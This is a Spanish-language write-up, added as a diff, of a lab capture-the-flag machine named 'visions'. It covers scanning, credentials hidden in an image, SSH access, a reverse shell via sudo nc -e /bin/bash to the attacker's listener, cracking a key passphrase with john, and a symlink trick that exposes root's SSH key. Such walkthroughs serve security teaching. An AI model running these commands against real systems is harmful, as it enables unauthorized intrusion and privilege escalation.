@@ -1,0 +1,167 @@
+Identificamos la IP:
+❯ arp-scan --interface=wlo1 --localnet | grep PCS | awk '{print $1}'
+192.168.1.119
+
+Enumeramos puertos:
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oN 01-allPorts 192.168.1.119
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-31 15:24 -0400
+Nmap scan report for 192.168.1.119
+Host is up (0.00027s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:7E:2B:91 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds
+
+❯ nmap -sCV -p 22,80 -oN 02-targeted.txt 192.168.1.119
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-31 15:24 -0400
+Nmap scan report for 192.168.1.119
+Host is up (0.00031s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 85:d0:93:ff:b6:be:e8:48:a9:2c:86:4c:b6:84:1f:85 (RSA)
+|   256 5d:fb:77:a5:d3:34:4c:46:96:b6:28:a2:6b:9f:74:de (ECDSA)
+|_  256 76:3a:c5:88:89:f2:ab:82:05:80:80:f9:6c:3b:20:9d (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
+
+Entramos al sitio, y solo encontramos un mensaje en el código fuente de la página:
+<!-- 
+Only those that can see the invisible can do the imposible.
+You have to be able to see what doesnt exist.
+Only those that can see the invisible being able to see whats not there.
+-alicia -->
+...
+<img src="white.png">
+
+Descubrimos un potencial usuario, descargamos y analizamos la imagen con exiftool:
+❯ exiftool white.png
+...
+Comment     : pw:ihaveadream
+...
+
+Continuamos con strings:
+❯ strings -n 5 white.png
+
+Utilizamos la herramienta https://www.aperisolve.com/ y descubrimos un mensaje oculto en la imagen:
+sophia/seemstobeimpossible
+
+Utilizaremos estas credenciales más adelante.
+
+Establecemos una conexión con el usurio alicia por SSH:
+❯ ssh alicia@192.168.1.119
+alicia@192.168.1.119's password: ihaveadream
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+alicia@visions:~$
+
+Enumeramos los usuarios con una bash establecida:
+alicia@visions:~$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+emma:x:1000:1000:emma,,,:/home/emma:/bin/bash
+alicia:x:1001:1001:,,,:/home/alicia:/bin/bash
+sophia:x:1002:1002:,,,:/home/sophia:/bin/bash
+isabella:x:1003:1003:,,,:/home/isabella:/bin/bash
+
+Para movernos a otro usuario, ejecutamos el comando sudo -l:
+alicia@visions:~$ sudo -l
+Matching Defaults entries for alicia on visions:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User alicia may run the following commands on visions:
+    (emma) NOPASSWD: /usr/bin/nc 
+
+Podemos ejecutar el comando nc como el usuario emma. Con esto, podemos obtener una shell del usuario emma, realizando ejecutando una reverse shell:
+alicia@visions:~$ sudo -u emma nc 192.168.1.7 1234 -e /bin/bash &>/dev/null & disown
+
+❯ ncat -nlvp 1234
+Ncat: Version 7.97 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.119:49630.
+script /dev/null -c bash
+Script started, file is /dev/null
+emma@visions:/home/alicia$ export TERM=xterm
+export TERM=xterm
+emma@visions:/home/alicia$
+
+Encontramos una nota en el directorio home:
+emma@visions:~$ cat note.txt 
+I cant help myself.
+
+Nos logueamos como sophia y obtenemos la primera flag:
+alicia@visions:~$ su sophia
+Password: seemstobeimpossible
+sophia@visions:/home/alicia$ 
+
+Para escalar privilegios, ejecutamos el comando sudo -l:
+sophia@visions:~$ sudo -l
+Matching Defaults entries for sophia on visions:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sophia may run the following commands on visions:
+    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
+
+Podemos ejecutar el comando cat sobre el archivo /home/isabella/.invisible, como cualquier usuario y sin contraseña:
+sophia@visions:~$ sudo cat /home/isabella/.invisible
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+-----END OPENSSH PRIVATE KEY-----
+
+Nos intentamos conectar via SSH con el usuario isabella, pero esta solicita un passphrase.
+
+Crackeamos el passphrase con john:
+❯ ssh2john.py id_rsa_isabella > hash
+
+❯ john -w=/home/wh01s17/Documentos/wordlists/rockyou.txt hash
+...
+invisible        (id_rsa_isabella)
+...
+
+Nos conectamos por SSH:
+❯ ssh isabella@192.168.1.119 -i id_rsa_isabella
+Enter passphrase for key 'id_rsa_isabella': invisible
+
+isabella@visions:~$
+
+Para escalar al usuario root, recordamos que podemos ejecutar el comando cat sobre el archivo .invisible como cualquier usuario, por lo que creamos un enlace simbólico del id_rsa del usuario root y lo nombramos .invisible:
+isabella@visions:~$ mv .invisible .invisible_bak
+
+isabella@visions:~$ ln -s /root/.ssh/id_rsa .invisible 
+
+Volvemos al usuario sophia, el cuál tiene los privilegios sobre el comando cat, y listamos el archivo:
+sophia@visions:~$ sudo cat /home/isabella/.invisible 
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+-----END OPENSSH PRIVATE KEY-----
+
+❯ ssh root@192.168.1.119 -i id_rsa_root
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 19 05:24:08 2021
+root@visions:~#
+
+Obtenemos la última flag y fin.
+
